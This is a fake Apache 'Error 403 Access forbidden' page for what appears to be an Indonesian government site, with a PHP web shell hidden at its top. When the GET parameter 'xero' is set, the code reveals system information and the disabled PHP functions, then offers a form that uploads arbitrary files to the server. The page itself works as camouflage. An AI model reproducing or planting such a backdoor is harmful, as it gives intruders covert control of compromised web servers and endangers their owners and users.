<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
<html>
<body>
<h1>Access forbidden!</h1>
<p>


  

    You don't have permission to access the requested object.
    It is either read-protected or not readable by the server.

  

</p>
<p>
If you think this is a server error, please contact
the <a href="mailto:postmaster@localhost">webmaster</a>.

</p>

<h2>Error 403</h2>
<address>
  <a href="/">bpprd.bungokab.go.id</a><br />
  <span>Apache/2.4.37 (Win32) OpenSSL/1.0.2p PHP/5.6.40</span>
</address>
</body>
</html>
